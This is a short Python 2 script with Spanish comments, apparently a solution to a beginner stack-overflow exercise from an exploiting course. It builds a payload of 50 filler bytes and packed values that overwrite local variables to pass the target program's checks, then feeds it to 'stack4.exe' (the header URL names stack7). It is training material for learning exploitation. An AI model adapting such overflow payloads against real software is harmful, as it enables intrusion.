# http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/010%20stack7.idb/
import os
import struct

#junk para llegar a la primer cookie
buff = 'A' * 50
var_10 = struct.pack("<I", 0x71725553) #Primer if
var_C  = struct.pack("<I", 0x01020D0B) #Segundo if
var_8  = "JJJJ" # junk para llegar al ultimo if
var_4  = struct.pack("<I", 0x35224158) # valido el if de forma correcta

payload = buff + var_10 + var_C + var_8 + var_4 + "\n"
stdin, stdout = os.popen4("stack4.exe")

print "[#] Sending Payload"
stdin.write(payload)
print stdout.read(1024)
